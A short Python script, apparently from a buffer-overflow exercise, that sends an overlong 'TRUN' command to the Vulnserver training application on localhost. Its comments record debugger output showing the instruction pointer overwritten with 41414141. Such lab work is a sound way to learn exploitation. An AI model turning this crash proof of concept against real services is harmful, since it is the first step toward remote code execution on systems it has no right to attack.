
import socket


class Vulnserver:

    def teste1(self, ip):

        bytes = 2100
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 9999))
        buff = 'A' * bytes
        overflow = 'TRUN .' + buff
        s.send(overflow.encode())
        resposta = s.recvfrom(20)
        #   time.sleep(1)
        print(resposta, " = ", bytes)


Vulnserver().teste1('localhost')

"""
Resultado:
EAX 0080DC60
ECX 0080DC50
EDX 0080E440 ASCII "AAAAAAAAAA"
EBX 7BCBE000 ntdll.7BCBE000
ESP 0080E440 ASCII "AAAAAAAAAA"
EBP 41414141
ESI 7BCBE000 ntdll.7BCBE000
EDI 7FFD4000
EIP 41414141
C 0  ES 002B 32bit 0(FFFFFFFF)
P 0  CS 0023 32bit 0(FFFFFFFF)
A 0  SS 002B 32bit 0(FFFFFFFF)
Z 0  DS 002B 32bit 0(FFFFFFFF)
S 0  FS 0063 32bit 0(0)
T 0  GS 006B 32bit 0(0)
D 0
O 0  LastErr ERROR_SUCCESS (00000000)
EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G)
DR0 00000000
DR1 00000000
DR2 00000000
DR3 00000000
DR6 00000000
DR7 00000400


"""